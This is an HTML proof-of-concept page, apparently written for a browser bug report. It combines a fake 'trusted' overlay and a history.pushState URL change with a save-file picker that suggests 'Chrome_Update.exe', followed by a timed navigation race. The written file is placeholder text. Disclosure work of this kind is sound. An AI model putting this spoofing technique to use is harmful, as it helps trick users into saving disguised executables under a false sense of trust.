<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Save File Picker + Navigation Race PoC</title>
<style>
#panel {
  display: none;
  position: fixed;
  inset: 0;
  background: white;
  z-index: 9999;
}
</style>
</head>

<body>

<h1 id="trigger">Click anywhere</h1>

<div id="panel">
  <h2>Trusted Panel</h2>
</div>

<script>
const trigger = document.getElementById('trigger');
const panel = document.getElementById('panel');

/*
 * Step 1:
 * Fake trusted state before picker
 */
trigger.onclick = async () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';

  if (!window.showSaveFilePicker) return;

  try {
    // Save File Picker
    const handle = await showSaveFilePicker({
      suggestedName: 'Chrome_Update.exe',
      types: [{
        description: 'Executable File',
        accept: { 'application/octet-stream': ['.exe'] }
      }]
    });

    const w = await handle.createWritable();
    await w.write('PoC ONLY\nNot a real executable');
    await w.close();

  } catch (e) {
    // cancel expected
  }
};

/*
 * Step 2:
 * Trigger navigation race after permission flow
 */
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});
</script>

</body>
</html>
